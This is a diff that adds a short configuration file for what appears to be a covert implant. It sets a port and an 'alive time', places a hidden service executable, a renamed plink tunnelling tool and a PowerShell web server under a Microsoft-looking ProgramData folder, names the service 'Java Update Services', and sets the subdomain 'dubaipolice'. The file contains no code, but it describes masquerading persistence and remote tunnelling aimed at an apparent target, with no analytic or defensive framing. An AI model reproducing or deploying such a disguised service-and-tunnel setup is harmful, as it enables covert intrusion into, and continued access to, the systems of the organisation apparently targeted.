@@ -1,0 +1,10 @@
+port=>8000
+alive time=>24
+service path=>C:\ProgramData\Microsoft\Diagnostic\Java Update Services.exe =hidden
+plink path=>C:\ProgramData\Microsoft\Diagnostic\JavaUpdateServices.exe
+webserver path=>C:\ProgramData\Microsoft\Diagnostic\JavaUpdateServices.ps1
+
+subdomain=> dubaipolice
+service name=Java Update Services
+====
+
